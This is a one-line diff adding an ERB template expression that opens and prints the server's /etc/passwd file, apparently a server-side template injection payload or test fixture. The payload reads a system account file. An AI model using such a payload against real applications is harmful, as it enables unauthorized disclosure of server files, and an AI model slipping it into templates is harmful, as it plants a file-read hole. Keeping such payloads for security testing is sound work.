@@ -1,0 +1,1 @@
+<%= File.open('/etc/passwd').read %>
